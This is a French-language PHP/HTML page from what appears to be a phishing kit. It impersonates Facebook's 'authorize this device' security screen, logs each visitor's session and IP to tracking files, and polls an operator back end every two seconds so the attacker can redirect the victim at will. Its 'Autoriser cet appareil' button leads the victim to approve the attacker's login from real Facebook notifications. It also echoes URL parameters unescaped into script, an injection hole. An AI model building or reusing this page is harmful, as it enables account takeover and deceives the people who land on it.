<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'authorize_device.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autoriser l'appareil</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .logo {
            width: 60px;
            margin-bottom: 15px;
        }
        
        .card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: bold;
            color: #1c1e21;
        }
        
        h2 {
            font-size: 20px;
            margin-top: 30px;
            margin-bottom: 15px;
            color: #1c1e21;
        }
        
        p {
            font-size: 16px;
            margin-bottom: 15px;
            color: #1c1e21;
        }
        
        .image-container {
            background-color: #e7f3ef;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            margin: 25px 0;
        }
        
        .devices {
            display: flex;
            justify-content: space-around;
            align-items: center;
            margin: 20px 0;
        }
        
        .device {
            text-align: center;
        }
        
        .device i {
            font-size: 40px;
            color: #1877f2;
        }
        
        .shield {
            color: #f7b928;
            font-size: 60px;
            margin: 0 20px;
        }
        
        .dots {
            border-top: 2px dotted #ccc;
            width: 60px;
            height: 1px;
        }
        
        .button {
            display: block;
            width: 100%;
            padding: 12px 0;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            margin-bottom: 15px;
        }
        
        .button:hover {
            background-color: #166fe5;
        }
        
        .button.secondary {
            background-color: #e4e6eb;
            color: #1c1e21;
        }
        
        .button.secondary:hover {
            background-color: #d8dadf;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .footer a {
            color: #65676b;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .languages {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 10px;
        }
        
        .languages a {
            margin: 0 5px;
            color: #65676b;
            text-decoration: none;
            font-size: 12px;
        }
        
        .languages a:hover {
            text-decoration: underline;
        }
        
        .languages a.active {
            color: #1877f2;
        }
        
        .copyright {
            margin-top: 10px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img   src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/150px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook" class="logo">
        </div>
        
        <div class="card">
            <h1>Connectez-vous sur un autre appareil pour continuer</h1>
            
            <p>Lorsque nous ne pouvons pas nous assurer que la personne qui tente de se connecter à un compte en est bien le propriétaire, nous ajoutons une étape de sécurité supplémentaire à la connexion.</p>
            
            <p>Vous devez vous connecter sur un appareil que vous avez déjà utilisé auparavant et approuver cette connexion.</p>
            
            <div class="image-container">
                <div class="devices">
                    <div class="device">
                        <i class="fas fa-mobile-alt"></i>
                    </div>
                    <div class="dots"></div>
                    <div class="shield">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <div class="dots"></div>
                    <div class="device">
                        <i class="fas fa-laptop"></i>
                    </div>
                </div>
            </div>
            
            <h2>Je n'ai pas d'autre appareil</h2>
            
            <p>Si vous n'avez pas accès à un autre appareil que vous avez déjà utilisé pour vous connecter à ce compte, il n'est pas sûr de vous laisser vous connecter.</p>
            
            <a href="javascript:void(0)" class="button" id="authorizeBtn">Autoriser cet appareil</a>
            <a href="javascript:void(0)" class="button secondary" id="cancelBtn">Annuler</a>
        </div>
        
        <div class="footer">
            <div class="languages">
                <a href="#" class="active">Français (France)</a>
                <a href="#">English (US)</a>
                <a href="#">Español</a>
                <a href="#">Deutsch</a>
                <a href="#">Italiano</a>
                <a href="#">العربية</a>
                <a href="#">Português (Brasil)</a>
                <a href="#">हिन्दी</a>
                <a href="#">中文(简体)</a>
                <a href="#">日本語</a>
            </div>
            
            <div class="copyright">
                Meta © 2025
            </div>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'device_authorized') {
                           
                           // Recharger la page pour afficher le message d'erreur
                         
                       } 
                        else if (data.action === 'redirect' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
            
            // Gestionnaire pour le bouton d'autorisation
            document.getElementById('authorizeBtn').addEventListener('click', function() {

                window.open('https://facebook.com/notifications', '_blank');

                fetch('save_action.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'device_authorized',
                       // redirect: 'facebook_login.php'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                    }
                })
                .catch(error => {
                    console.error('Erreur:', error);
                });
            });
            
            // Gestionnaire pour le bouton d'annulation
            document.getElementById('cancelBtn').addEventListener('click', function() {
                window.location.href = `facebook_login.php?session=${sessionId}&ip=${clientIp}`;
            });
        });
    </script>
</body>
</html>